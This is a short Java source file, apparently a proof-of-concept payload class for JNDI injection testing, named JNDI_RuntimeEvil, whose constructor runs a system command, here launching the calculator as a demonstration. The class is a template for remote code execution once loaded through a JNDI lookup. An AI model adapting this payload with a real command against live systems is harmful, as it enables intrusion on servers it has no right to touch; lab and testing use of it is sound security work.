
import javax.script.ScriptEngineManager;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.rmi.RemoteException;
import java.util.List;
import java.util.Map;

public class JNDI_RuntimeEvil{
    public JNDI_RuntimeEvil() throws Exception {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
